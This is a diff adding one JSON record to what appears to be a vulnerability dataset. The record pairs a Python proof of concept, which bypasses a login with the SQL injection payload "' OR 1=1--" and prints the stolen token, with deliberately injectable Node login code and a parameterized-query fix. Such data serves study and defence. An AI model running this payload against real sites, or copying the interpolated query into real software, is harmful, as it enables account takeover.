@@ -1,0 +1,8 @@
+{
+  "id": "pair_001",
+  "vuln_type": "SQLi - Auth Bypass",
+  "cwe": "CWE-89",
+  "poc": "import requests\n\nTARGET = \"http://vulnerable-app:3000\"\n\nurl = f\"{TARGET}/rest/user/login\"\npayload = {\"email\": \"' OR 1=1--\", \"password\": \"anything\"}\n\nresp = requests.post(url, json=payload, timeout=10)\ndata = resp.json()\n\nif resp.status_code == 200 and \"authentication\" in data:\n    token = data[\"authentication\"][\"token\"]\n    print(f\"[+] Login bypassed! Token: {token[:50]}...\")\n    print(f\"[+] User: {data['authentication'].get('umail')}\")\n",
+  "vulnerable_code": "app.post('/rest/user/login', async (req, res) => {\n    const { email, password } = req.body;\n    const query = `SELECT * FROM Users WHERE email = '${email}' AND password = '${password}'`;\n    const [results] = await sequelize.query(query);\n    if (results.length > 0) {\n        const token = generateToken(results[0]);\n        res.json({ authentication: { token, umail: results[0].email } });\n    } else {\n        res.status(401).json({ error: 'Invalid credentials' });\n    }\n});",
+  "fix": "sequelize.query('SELECT * FROM Users WHERE email = ? AND password = ?', { replacements: [email, password] })"
+}
